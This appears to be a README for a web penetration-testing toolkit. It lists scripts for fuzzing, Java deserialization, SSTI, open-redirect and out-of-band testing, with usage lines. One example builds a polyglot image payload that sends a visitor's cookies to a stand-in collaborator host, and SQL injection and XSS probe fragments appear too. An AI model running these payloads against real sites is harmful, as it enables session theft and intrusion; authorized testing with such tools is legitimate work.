# SCRIPTS
> This directory contains scripts that I have written which are used in the :small_red_triangle_down:`crimson`:small_red_triangle_down:

## :small_red_triangle_down:crimson_mutator

> Mutate given wordlist with various techniques.

### Available payload mutations:
* CaMeL CaSe
* Full URL encoding
* Double URL encoding
* Triple URL encoding
* ZEROFILL keyword between each letter
* Spaces changed for [+] sign
* Spaces changed for [+] sign and encode rest as url
* URL key chars encoded
* Upcase
* Downcase

### Usage example:
```bash
python crimson_mutator [list_with_payloads]
```

## :small_red_triangle_down:crimson_opener

> Opens urls in firefox for manual testing

#### WORKFLOW
1. Create a "manual_payloads.txt" wordlist with payloads to use and place it in the same directory.
2. Start the ./crimson_opener.py  -u -l -o
3. Open single URL                -u https://url/FUZZ 
4. Open wordlist(with fuzzing)    -l [lists_with_urls/FUZZ] 
5. Open wordlist(without fuzzing) -o [list_with_urls]
F.e: crimson_opener.py -u https://www.example.com/FUZZ
###
### Usage example:
* Single url
```bash
python crimson_opener.py -u https://www.example.com
```
* List of urls
```bash
python crimson_opener.py -l list_of_urls.txt
```
* Open in browser `list_of_urls` without fuzzing with `manual_payloads.txt`
```bash
python crimson_opener.py -o list_of_urls.txt
```

## :small_red_triangle_down:crimson_payloader

> Combine 4 wordlists into one "payloads.txt". It may be used to profiled attacks
### Wordlists:
1. affix    (breaker)   - this wordlist contains char or chars that break the syntax f.e. `' (single quote)`
2. main     (payload)   - this wordlist contains core of your payload f.e. `or 1=1`
3. suffix   (comment)   - this wordlist contains char or chars that are at the end of payload f.e. `# (hash sign)`
4. add      (addons)    - this wordlist contains working payloads, it will be added at the end of `payloads.txt`

### WORKFLOW
1. Create 4 wordlists as described above
2. Start the script: python crimson_payloader


## :small_red_triangle_down:clever_ffuf

> Reads the lines in `status_ffuf.txt` and remove trash responses based on an algorithm. Then store the output in `temp_ffuf.txt`

### How to get proper format to use it:
1. Make directory brutefrocing using `ffuf`:
```bash
ffuf -w custom_dir.txt -u https://$domain/FUZZ -mc all -fc 400 -H $cookie -o ffuf.json > /dev/null
```
2. Parse the json output using `jq`:
```bash
cat ffuf.json | jq -c '.results[] | {url:.url,status: .status}' > status_ffuf.txt
```
3. Run the `clever_ffuf`
```bash
python clever_ffuf.py
```

## :small_red_triangle_down:crimson_backuper

> Check backups of bruteforced files by adding extensions to it.

### Usage example:
```bash
python crimson_backuper.py -w urls.txt -c "Cookie: auth1=qwe; auth2=asd;" -H "asd=1" -H "qwe=2" -e extension_list.txt
```

## :small_red_triangle_down:crimson_deserializator

> Tests for java deserialization flaws using `URLDS` or `JRMPClient` gadget chain.

### Functions:
* CHANGE get TO post METHOD
* CREATE URLDNS OR JRMPClient PAYLOAD FOR JAVA DESERIALIZATION
* SEND PAYLOAD INTERCHANGEABLY IN EVERY PARAMETER VALUE

### Usage example:
* You have to install ysoserial and place it in `$HOME/tools/ysoserial/ysoserial.jar`.
* If you are using IP, open port 80 on your listener.
* If you are using domain, start collaborator.
```bash
python crimson_deserializator -w list_of_urls.txt -i "vps_ip" or -d "collaborator_domain" -H "h=123" -c "Cookie: a=1;"
```

## :small_red_triangle_down:crimson_jsextractor

> Bash script that automates process of new endpoints gathering. Uses `zile` and `relative-url-extractor`.

### Usage example:
* Single url:
```bash
./crimson_jsextractor.sh http://127.0.0.1:1234/aaa
```
* List of urls:
```bash
crimson_jsextractor.sh -l list_of_urls.txt
```

## :small_red_triangle_down:crimson_oobtester

> Tests urls for out-of-bound interactions using out-of-bound payloads

### Usage example:
* oob.txt could be found in `exp` directory in this repository.
* oob.txt should contains payloads with `vps_ip` or `domain_collab` in lines to swap these values with given ip or domain f.e. `[payload]vps_ip`
* urls.txt should contains urls with queries to inject
```bash
python crimson_oobtester.py -i "10.10.10.11" -d "6jqzryc8olgv0qt732epxdxokfq5eu.collaborator.com" -p "oob.txt" -w "urls.txt" -H "header=asd" -c "Cookie: cookie1=123; cookie2=123;" -o "output.txt"
```

## :small_red_triangle_down:crimson_paramjuggler

> This tool takes the URL and swap the argument for the given payload

### Usage example:
```bash
python crimson_paramjuggler.py -u [url] -l [wordlist] -p [payload]
```

### Example swap of `http://url?a1=x&a2=y`
```bash 
http://url?a1=[payload]&a2=y
http://url?a1=x&a2=[payload]
```

## :small_red_triangle_down:crimson_rewriter

> Check if the `X-Rewrite-Url` or `X-Original-Url` header is supported

### Usage example:
```bash
python crimson_rewriter.py -w wordlist_with_urls.txt -H "custom=header" -c "Cookie: a=1;"
```

## :small_red_triangle_down:crimson_templator

> Test for SSTI injection with `7777` reflection based technique and `500` internal error based technique.

### Usage example:
```bash
python crimson_templator.py -w urls.txt -c "Cookie: auth1=qwe; auth2=asd;" -H "asd=1" -H "qwe=2"
```

## :small_red_triangle_down:crimson_mass_nmap

> For scanning a large number of IP:PORT services list.

### Usage example (all.txt
```bash
# you need "all.txt" file in your working directory
python crimson_mass_nmap
```

## :small_red_triangle_down:crimson_faker

> Template for generating fake data for API testing.

## :small_red_triangle_down:crimson_redirector

> Generate a wordlist for Open Redirection testing.

### Usage example:
```bash
crimson_redirectOR.py whitelisted.com afine.com 123.123.123.123 redirect_uri
```


## :small_red_triangle_down:pol_jpg_js_gif_gen.py

> Script for generating a JPG_JS | GIF_JS files for bypassing the CSP using the technique described [here](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs).

> Script is modified version of the original one located [here](https://github.com/s-3ntinel/imgjs_polygloter).

### Usage example:
```
python3 pol_jpg_js_gif_gen.py jpg -H 250 -W 250 -p 'document.location.href="http://domain_collab?"+document.cookie;' -o a.jpg
```
```js
<script charset="ISO-8859-1" src="/upload/file"></script>
```

## :small_red_triangle_down: internal_addr_disclosure.py

> Send a raw 'GET / HTTP/1.0' request to a server and prints the response (handy for checking the Location for the internal IP leak).

### Usage example:
```bash
python3 internal_addr_disclosure.py -d afine.com -p 443 --ssl
python3 internal_addr_disclosure.py -d afine.com -p 80 -m POST -e /test -v 'HTTP/1.0'
python3 internal_addr_disclosure.py -d afine.com -p 80 -v 'HTTP/1.1'
python3 internal_addr_disclosure.py -d afine.com -p 80 -o internal_addr_disclosure_test_afine_com_80.log
```

## :small_red_triangle_down: combiner.py

> Combines each line of file_1 with each line of file_2.

### Usage example:
```bash
python combine.py --file_1 CRLF --file_2 OOB --out combined.txt
```

## :small_red_triangle_down: proxy_fuzer.py

> [Article](https://karol-mazurek.medium.com/proxy-fuzzing-4dc77968cfd8?sk=v2%2F5799b46b-6440-4d29-9aec-6736fa5eddc1)

### Usage example:
```bash
echo "<script>alert(1)</script>" > payload.bin
python proxy_fuzzer.py
```
